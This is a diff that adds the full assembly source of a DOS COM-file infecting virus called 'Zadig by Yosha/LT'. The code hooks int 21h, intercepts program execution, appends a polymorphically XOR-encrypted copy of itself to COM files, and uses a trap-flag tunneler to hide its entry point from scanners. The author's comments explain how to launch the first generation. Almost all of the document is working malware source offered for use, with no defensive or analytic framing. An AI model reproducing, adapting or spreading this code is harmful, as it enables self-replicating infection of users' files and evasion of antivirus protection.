@@ -1,0 +1,849 @@
+Zadig
+Yosha
+;Zadig by Yosha/LT
+
+;COM files are executed with function ax=4b01h (used by debuggers) so that
+;the virus can intercept file execution.  After the file is loaded, but
+;before it is allowed to execute, int 1 is hooked and the trap flag is set.
+;This makes for a simple surface tunneler.  This nice dos function could have
+;other uses, like patching anti-virus programs as they execute.
+
+;The entry point is hidden by the surface tunneling, and the virus itself is
+;hidden by some cheesy poopymorphics, making it somewhat difficult to scan.
+;Infected files are marked read-only.  Dos 7 COM files work correctly.
+
+;To get the first gen working you need to load it up in debug, type rsp
+;(enter) and ffec (enter) and g (enter).  Then run a bunch of COM files.
+;Thanks to Random/LT for unknowingly giving me the idea ;>
+
+.model tiny
+.code
+.386
+CodeLength equ Offset Finish - Offset Start
+MemLength equ (((Offset EndHeap - Offset Start)*2)+20fh)/16
+org 0h
+
+;----------------------------------------------------------------------------
+Start:
+        push    ds
+        push    es
+
+        Call    $+3
+        pop     bp
+        sub     bp,Offset $ - 1
+
+        cld                             ;check for residency
+        mov     ax,3000h
+        mov     di,1234h
+        int     21h
+        cmp     di,4321h
+        jz      DoneInstalling
+
+        push    cs
+        pop     es
+
+        mov     ah,4ah                  ;get size of memory block
+        xor     bx,bx
+        dec     bx
+        int     21h
+
+        mov     ah,4ah                  ;shrink it by enough for virus
+        sub     bx,MemLength+1
+        int     21h
+
+        mov     ah,48h                  ;allocate a memory block for virus
+        mov     bx,MemLength
+        int     21h
+        jc      DoneInstalling
+
+        push    ax                      ;set owner to 8 so mem isn't deallocated
+        dec     ax
+        mov     ds,ax
+        mov     di,8
+        mov     word ptr [di-7],di
+
+        pop     es                      ;copy code to allocated memory
+        push    cs
+        pop     ds
+        mov     si,bp
+        xor     di,di
+        mov     cx,CodeLength
+        rep     movsb
+
+        mov     ds,cx                   ;store int 21h vector
+        mov     si,21h*4
+        movsw
+        movsw
+
+        mov     word ptr [si-4],Offset Int21Handler
+        mov     word ptr [si-2],es
+DoneInstalling:
+        push    cs
+        pop     ds
+        push    cs
+        pop     es
+
+        mov     di,word ptr [bp+OldEntry]
+        mov     word ptr [Bp+OldIPPatch],di
+        lea     si,[bp+Offset OldBytes]
+        movsw                           ;restore host code
+        movsb
+
+        pop     es                      ;restore registers/flags, return to
+        pop     ds                      ;host
+        popa
+        popf
+                db      68h             ;push immediate, 286+
+OldIPPatch      dw      ?
+        ret
+;----------------------------------------------------------------------------
+
+
+;miscellaneous crap
+;----------------------------------------------------------------------------
+OldBytes:
+        int     20h
+        db      0ffh
+OldEntry        dw      ?
+NewBytes        db      0e9h,0,0
+Signature       db      ' Zadig by Yosha[LT] '
+Call21:
+        pushf
+        push    cs
+        push    Offset Return
+        Jmp     JmpExit21
+Return:
+        ret
+Int24Handler:
+        mov     al,3
+        iret
+Mov2EOF:
+        mov     ax,4202h
+        cwd
+        jmp     SaveSpace
+Mov2SavedOffset:
+        mov     ax,4200h
+        mov     dx,word ptr [SavedOffset]
+SaveSpace:
+        xor     cx,cx
+        Call    Call21
+        ret
+;----------------------------------------------------------------------------
+
+
+;----------------------------------------------------------------------------
+Poly:
+        cld
+        push    si
+        push    bp
+        push    cx
+        mov     di,offset InJmp
+        mov     word ptr [di-2],0808h
+        xor     ax,ax
+        stosw
+        stosw
+        xor     bp,bp
+;phase 1 - generate junk that alters neither registers nor flags, and pushf
+        mov     al,FlagReglessJunk
+        Call    GenerateJunk
+        mov     al,0
+        org     $ - 1
+        pushf
+        stosb
+;phase 2 - generate junk that can only alter flags, but not regs, and pusha
+        mov     al,RegLessJunk
+        Call    GenerateJunk
+        mov     al,0
+        org     $ - 1
+        pusha
+        stosb
+;phase 3 - generate junk that can alter regs/flags and then generate an
+;instruction equivalent to mov (counter register),counter
+;for now just uses mov cx,immediate
+        mov     al,FlagRegJunk
+        Call    GenerateJunk
+        Call    GetRegister
+        mov     byte ptr [CounterReg],al
+        add     al,0b8h
+        stosb
+        pop     cx
+        inc     cx
+        shr     cx,1
+        Call    Random
+        and     ax,0fh
+        add     ax,cx
+        mov     word ptr [Counter],ax
+        stosw
+;phase 4 - generate junk that can alter regs/flags other than the counter
+;register and then mov (Crypt Pointer Register),immediate or equivalent
+;for now just use mov si
+        mov     al,FlagRegJunk
+        Call    GenerateJunk
+TryAgain:                                       ;bx,di,bp,or si only
+        Call    GetRegister
+        cmp     al,3
+        jb      TryAgain
+        mov     byte ptr [PointerReg],al
+        add     al,0b8h
+        stosb
+        scasw
+        push    di
+;phase 5 - generate 16 bit xor encryption instruction
+;for now just use xor word ptr cs:[PointerReg],CryptVal
+;can have no offset, 8 bit offset, or 16 bit offset
+        mov     al,FlagRegJunk
+        Call    GenerateJunk
+        mov     ax,812eh
+        stosw
+GetNewMode:
+        mov     bl,byte ptr [PointerReg]
+        Call    Random
+        and     al,11000000b                    ;clear bits
+        cmp     al,11000000b                    ;avoid reg,reg mode
+        je      GetNewMode
+        or      al,al                           ;bp can't use 00 mode
+        jnz     ModeOk
+        cmp     bl,5                            ;bp
+        je      GetNewMode
+ModeOk:
+        or      al,110000b                      ;makes it XOR
+        cmp     bl,3
+        jne     NotBX
+        or      al,111b
+NotBX:
+        cmp     bl,5
+        jne     NotBP
+        or      al,110b
+NotBP:
+        cmp     bl,6
+        jne     NotSI
+        or      al,100b
+NotSI:
+        cmp     bl,7
+        jne     NotDI
+        or      al,101b
+NotDI:
+        stosb
+
+        xchg    bx,ax
+        Call    Random
+        and     bl,11000000b
+        cmp     bl,1000000b
+        jne     Not8BitOffset
+        and     al,7fh
+        mov     byte ptr [Modifier],al
+        stosb
+Not8BitOffset:
+        cmp     bl,10000000b
+        jne     Not16BitModifier
+        and     ah,7fh
+        mov     word ptr [Modifier],ax
+        stosw
+Not16BitModifier:
+        Call    Random
+        stosw
+        mov     word ptr [CryptVal],ax
+;phase 6 - Increment Pointer Register by 2
+;uses inc ptr/inc ptr for now
+        mov     al,FlagRegJunk
+        Call    GenerateJunk
+        mov     al,byte ptr [PointerReg]
+        add     al,40h
+        stosb
+        push    ax
+        mov     al,FlagRegJunk
+        Call    GenerateJunk
+        pop     ax
+        stosb
+;phase 7 - decrement counter register
+;uses dec counter for now
+        mov     al,FlagRegJunk
+        Call    GenerateJunk
+        mov     al,byte ptr [CounterReg]
+        add     al,48h
+        stosb
+;phase 8 - generate 386+ jne instruction
+        mov     al,FlagRegLessJunk
+        Call    GenerateJunk
+        mov     al,0fh
+        stosb
+        mov     al,2
+        Call    GetChoice
+        dec     ax
+        mov     al,85h
+        stosb
+        pop     ax
+        push    ax
+        sub     ax,di
+        dec     ax
+        dec     ax
+        stosw
+        mov     al,FlagRegJunk
+        Call    GenerateJunk
+;patch mov si,offset EncryptedCode
+        mov     ax,di
+        mov     dx,Offset PolyBuffer
+        sub     ax,dx
+        pop     bx
+        dec     bx
+        dec     bx
+        pop     cx
+        add     ax,cx
+        sub     ax,word ptr [Modifier]
+        mov     word ptr [bx],ax
+;copy virus code to buffer and encrypt
+        pop     si
+        mov     cx,1234h
+        org     $ - 2
+Counter dw      ?
+        push    cx
+EncryptCode:
+        lodsw
+        xor     ax,1234h
+        org     $ - 2
+CryptVal        dw      ?
+        stosw
+        loop    EncryptCode
+;now return to caller with appropriate register values
+        pop     cx
+        shl     cx,1
+        add     cx,di
+        sub     cx,dx
+        ret
+;----------------------------------------------------------------------------
+
+
+;----------------------------------------------------------------------------
+GenerateJunk:
+        push    dx
+        push    bx
+        push    ax
+        Call    Random
+        and     al,111b
+        jnz     NoSegReg
+        mov     al,NumSegRegs
+        mov     bx,Offset SegRegs
+        Call    GetChoice
+        xlat
+        stosb
+NoSegReg:
+        pop     ax
+        pop     bx
+        push    bx
+        push    ax
+        Call    GetChoice                       ;al limits junk selection
+        shl     ax,1
+        xchg    ax,si
+        pop     ax
+        push    ax
+        Call    word ptr [si+Offset JunkCallTable]
+        Call    Random
+        test    al,3
+        pop     ax
+        pop     bx
+        pop     dx
+        jnz     GenerateJunk
+        ret
+GetRegister:
+        mov     al,8
+        Call    GetChoice
+        cmp     al,4                            ;avoid sp
+        je      GetRegister
+        cmp     al,byte ptr [CounterReg]
+        je      GetRegister
+        cmp     al,byte ptr [PointerReg]
+        je      GetRegister
+        ret
+GetChoice:
+        push    dx
+        push    cx
+        cbw
+        xchg    cx,ax
+        Call    Random
+        xor     dx,dx
+        div     cx
+        xchg    dx,ax
+        pop     cx
+        pop     dx
+        ret
+Random:
+        push    ds
+        push    0f000h
+        pop     ds
+        in      ax,40h
+        rol     ax,3
+        xor     ax,word ptr [bp]
+        inc     bp
+        inc     bp
+        pop     ds
+        ret
+GenJmp:
+        mov     bl,1
+        xchg    byte ptr [InJmp],bl
+        or      bl,bl
+        jnz     Return2
+
+        push    ax
+        mov     al,2
+        Call    GetChoice
+        dec     ax
+        mov     al,0ebh
+        jnz     GotJmpType
+        Call    Random
+        and     al,0fh
+        or      al,70h
+GotJmpType:
+        stosb
+        Call    Random
+        and     al,0fh
+        stosb
+        cbw
+        add     ax,di
+        xchg    bx,ax
+        pop     ax
+        cmp     di,bx
+        jz      DoneJmp
+NotFarEnough:
+        mov     dx,di
+TooFar:
+        mov     di,dx
+        Call    GenerateJunk
+        cmp     di,bx
+        jb      NotFarEnough
+        cmp     di,bx
+        ja      TooFar
+DoneJmp:
+        mov     byte ptr [InJmp],0
+Return2:
+        ret
+GenNoRegs1:
+        mov     al,NumNoRegs1
+        jmp     $+4
+GenNoFlagsNoRegs1:
+        mov     al,NumNoFlagsNoRegs1
+        Call    GetChoice
+        mov     bx,Offset NoFlagsNoRegs1
+        xlat
+        stosb
+        ret
+GenNoRegs2:
+        mov     al,NumNoRegs2
+        mov     bx,Offset NoRegs2
+        jmp     PutDownNoReg2
+GenNoFlagsNoRegs2:
+        mov     al,NumNoFlagsNoRegs2
+        mov     bx,Offset NoFlagsNoRegs2
+PutDownNoReg2:
+        Call    GetChoice
+        xlat
+        xchg    bx,ax
+        mov     al,2
+        Call    GetChoice
+        add     al,bl
+        stosb
+        mov     al,8
+        Call    GetChoice
+        mov     bl,al
+        or      al,11000000b
+        shl     bl,3
+        or      al,bl
+        stosb
+        ret
+GenIncDecSame:
+        mov     bl,40h
+        jmp     $+4
+GenPushPopSame:
+        mov     bl,50h
+        mov     al,8
+        Call    GetChoice
+        add     al,bl
+        stosb
+        add     al,8
+        stosb
+        ret
+GenPushPop:
+        mov     bl,1
+        xchg    byte ptr [InPush],bl
+        or      bl,bl
+        jnz     Return2
+
+        push    ax
+        mov     al,8
+        Call    GetChoice
+        add     al,50h
+        stosb
+        pop     ax
+        Call    GenerateJunk
+        Call    GetRegister
+        add     al,58h
+        stosb
+        mov     byte ptr [InPush],0
+        ret
+GenIncOrDec:
+        Call    GetRegister
+        xchg    bx,ax
+        mov     al,2
+        Call    GetChoice
+        shl     al,3
+        add     al,40h
+        add     al,bl
+        stosb
+        ret
+Gen2:
+        Call    Random
+        and     al,101000b
+        or      al,11b
+        stosb
+        mov     al,8
+        Call    GetChoice
+        xchg    bx,ax
+        Call    GetRegister
+        shl     al,3
+        or      al,bl
+        or      al,11000000b
+        stosb
+        ret
+;----------------------------------------------------------------------------
+
+
+;----------------------------------------------------------------------------
+SegRegs                 db      2eh,26h,3eh,36h,64h,65h
+NumSegRegs              equ     $ - Offset SegRegs
+NoFlagsNoRegs1          db      90h,90h,0f2h,0f3h
+NumNoFlagsNoRegs1       equ     $ - Offset NoFlagsNoRegs1
+NoRegs1                 db      9bh,0f5h,0f8h,0f9h,0fah,0fbh,0fch,0fdh
+NumNoRegs1              equ     $ - Offset NoRegs1
+NoFlagsNoRegs2          db      86h,88h
+NumNoFlagsNoRegs2       equ     $ - Offset NoFlagsNoRegs2
+NoRegs2                 db      0ah,22h,3ah,84h
+NumNoRegs2              equ     $ - Offset NoRegs2
+
+FlagRegLessJunk equ     4
+RegLessJunk     equ     7
+FlagRegJunk     equ     10
+
+JunkCallTable:
+        dw      Offset GenJmp                   ;\
+        dw      Offset GenNoFlagsNoRegs1        ; \ don't alter regs or flags
+        dw      Offset GenNoFlagsNoRegs2        ; /
+        dw      Offset GenPushPopSame           ;/
+        dw      Offset GenNoRegs1               ;\
+        dw      Offset GenNoRegs2               ;- don't alter regs
+        dw      Offset GenIncDecSame            ;/
+        dw      Offset GenPushPop               ;\
+        dw      Offset GenIncOrDec              ;- can alter regs/flags
+        dw      Offset Gen2                     ;/
+NumJunk equ     ($ - Offset JunkCallTable)/2
+
+;----------------------------------------------------------------------------
+
+
+
+;my lame surface tunneler ;>
+;----------------------------------------------------------------------------
+Int1Handler:
+        push    di
+        push    bp                      ;don't use pusha to keep stack usage
+        push    ax                      ;small
+        push    si
+        push    es
+        push    ds
+        mov     bp,sp
+
+        cld
+        lds     si,dword ptr ss:[bp+12] ;ds:si = cs:ip
+        lodsb                           ;get next instruction
+
+        cmp     al,0e3h                 ;next 2 cmps cover loop,loopnz,loopz
+        ja      Exit1                   ;and jcxz
+        cmp     al,0e0h
+        jae     ClearTF
+        and     al,0f0h
+        cmp     al,70h                  ;conditional jmp?
+        jne     Exit1
+ClearTF:
+        dec     si                      ;save offset and 3 bytes (so we don't
+        push    cs                      ;change self-modifying code or code
+        pop     es                      ;outside the program's body)
+        mov     di,Offset OldEntry
+        mov     ax,si
+        stosw
+        mov     di,Offset SavedOffset
+        stosw
+        dec     byte ptr es:[di-1]
+        movsw
+        movsb
+        and     byte ptr ss:[bp+17],-2  ;clear trap flag on stack
+Exit1:
+        pop     ds
+        pop     es
+        pop     si
+        pop     ax
+        pop     bp
+        pop     di
+        iret
+;----------------------------------------------------------------------------
+
+
+
+;actual infection routine, done AFTER file execution
+;----------------------------------------------------------------------------
+Infect:
+        pushf
+        pusha
+        push    es
+        push    ds
+
+        push    cs                      ;set int 24h handler
+        pop     ds
+        mov     ax,2524h
+        mov     dx,Offset Int24Handler
+        Call    Call21
+
+        mov     ax,4300h                ;save/clear file attributes
+        push    ax
+        mov     dx,Offset FileNameBuffer
+        Call    Call21
+        pop     ax
+        inc     ax
+        push    ax
+        push    cx
+        push    dx
+        and     cx,1
+        jnz     RestoreAttributes
+        Call    Call21
+
+        mov     ax,3d02h                ;open file read/write access
+        Call    Call21
+        jc      RestoreAttributes
+        xchg    bx,ax
+
+        mov     ax,5700h
+        Call    Call21
+        push    ax
+        push    cx
+        push    dx
+
+        Call    Mov2SavedOffset
+
+        mov     ah,3fh                  ;read in 3 bytes from saved location
+        mov     dx,Offset OldBytes
+        mov     cl,3
+        Call    Call21
+        jc      RestoreDateTime
+
+        cld                             ;make sure they match
+        mov     si,dx
+        push    cs
+        pop     es
+        mov     di,Offset Buffer
+        cmpsw
+        jne     RestoreDateTime
+        cmpsb
+        jne     RestoreDateTime
+
+        Call    Mov2EOF                 ;check file size
+        cmp     ax,60000
+        ja      RestoreDateTime
+        cmp     ax,200
+        jb      RestoreDateTime
+        xchg    si,ax
+
+        Call    Mov2SavedOffset
+        sub     si,ax
+        sub     si,3
+        mov     word ptr [NewBytes+1],si
+
+        mov     ah,40h                  ;write in new jmp
+        mov     cx,3
+        mov     dx,Offset NewBytes
+        Call    Call21
+
+        mov     ax,4202h                ;move to eof - 7
+        mov     dx,-7
+        mov     cx,-1
+        Call    Call21
+
+        mov     ah,3fh
+        mov     dx,Offset Last7Bytes
+        mov     cx,7
+        Call    Call21
+
+        push    bx
+        Call    Mov2EOF
+        inc     ah
+        xchg    bp,ax
+        mov     cx,CodeLength
+        xor     si,si
+        call    poly
+        pop     bx
+        mov     ah,40h
+        Call    Call21
+
+        add     ax,7
+        add     word ptr [Last7Bytes+5],ax
+        mov     ah,40h                  ;write in original last 7 bytes
+        mov     cx,7
+        mov     dx,Offset Last7Bytes
+        Call    Call21
+
+        mov     bp,sp                   ;set file as read-only
+        or      byte ptr [bp+9],1
+RestoreDateTime:
+        pop     dx
+        pop     cx
+        pop     ax
+        inc     ax
+        Call    Call21
+
+        mov     ah,3eh
+        Call    Call21
+RestoreAttributes:
+        pop     dx
+        pop     cx
+        pop     ax
+        Call    Call21
+ExitInfect:
+        pop     ds
+        pop     es
+        popa                            ;exit virus
+        popf
+        pop     cx                      ;ax=4b01h screws with your stack
+        retf    2                       ;return to parent program
+;----------------------------------------------------------------------------
+
+
+
+;loads and begins tracing the file
+;----------------------------------------------------------------------------
+LoadAndTrace:
+        push    es                      ;copy parameter block at es:bx
+        pop     ds                      ;(needed because function ax=4b01h
+        push    cs                      ;takes 2 more dwords for cs:ip and
+        pop     es                      ;ss:sp than does does ax=4b00h)
+        mov     si,bx
+        mov     di,Offset ParameterBlock
+        mov     cx,16h
+        rep     movsb
+
+        pop     ds                      ;copy filename
+        push    ds
+        mov     si,dx
+        lodsb
+        or      al,al
+        stosb
+        jnz     $ - 4
+
+        cmp     word ptr [si-4],'OC'    ;make sure it has .COM extension
+        jne     Exit21                  ;(makes it faster on executing EXEs)
+
+        mov     ax,3d00h                ;try to open file
+        Call    Call21
+        jc      Exit21
+        xchg    bx,ax
+
+        mov     ah,3fh                  ;read 2 bytes
+        push    cs
+        pop     ds
+        mov     cx,2
+        mov     dx,Offset Buffer
+        Call    Call21
+
+        mov     ah,3eh                  ;close file
+        Call    Call21
+
+        mov     si,dx                   ;don't infect EXEs
+        lodsw
+        xor     al,ah
+        xor     al,'Z' xor 'M'
+        jz      Exit21
+
+        pop     ds                      ;ax=4b01h, load but do not exec
+        pop     ax                      ;get es off stack
+        popa
+        popf
+        mov     bx,offset ParameterBlock
+        mov     si,bx
+        mov     al,1
+        Call    Call21
+
+        mov     ah,62h                  ;set terminate address
+        Call    Call21
+        mov     es,bx
+        mov     word ptr es:[0ah],Offset Infect
+
+        push    cs                      ;hook Int 1
+        pop     ds
+        mov     ax,2501h
+        mov     dx,Offset Int1Handler
+        Call    Call21
+
+        cli                             ;switch to host stack
+        mov     sp,word ptr [si+0eh]
+        mov     ss,word ptr [si+10h]
+        sti
+
+        pushf                           ;set trap flag on stack
+        pop     ax
+        or      ah,1
+        push    ax
+        push    word ptr [si+14h]       ;push cs
+        push    word ptr [si+12h]       ;push ip
+        mov     ds,bx                   ;set starting values of registers
+        xor     ax,ax
+        xor     bx,bx
+        mov     bp,091ch
+        mov     si,100h
+        mov     di,0fffeh
+        iret                            ;execute host
+;----------------------------------------------------------------------------
+
+
+
+;----------------------------------------------------------------------------
+Int21Handler:
+        pushf
+        pusha
+        push    es
+        push    ds
+        cmp     ax,4b00h
+        je      LoadAndTrace
+        cmp     ax,3000h
+        jne     Exit21
+        cmp     di,1234h
+        jne     Exit21
+        mov     di,4321h
+        add     sp,22
+        iret
+Exit21:
+        pop     ds
+        pop     es
+        popa
+        popf
+JmpExit21:
+        db      0eah
+;----------------------------------------------------------------------------
+
+
+Finish:
+
+Old21           dd      ?
+ParameterBlock  db      16h dup (?)
+FileNameBuffer  db      256 dup (?)
+SavedOffset     dw      ?
+Buffer          db      3 dup (?)
+Last7Bytes      db      7 dup (?)
+CounterReg      db      ?
+PointerReg      db      ?
+InJmp           db      ?                       ;don't want recursive jmps
+InPush          db      ?
+Modifier        dw      ?
+PolyBuffer:
+
+EndHeap:
+        End     Start
+
+
+
+
+
